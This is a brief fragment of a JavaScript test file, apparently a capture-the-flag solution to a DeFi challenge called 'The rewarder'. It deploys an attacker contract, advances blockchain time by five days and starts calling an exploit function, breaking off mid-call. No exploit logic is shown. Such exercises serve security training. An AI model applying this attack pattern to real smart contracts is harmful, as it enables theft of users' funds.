...
describe('[Challenge] The rewarder', function () {
    ...
    it('Exploit', async function () {
        ...
        const attackerContract = await (await ethers.getContractFactory("Ingenious")).deploy();

        // Execute hack on attacker contract after 5 days
        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
        const tx = await attackerContract.connect(attacker).mwaHahaha(
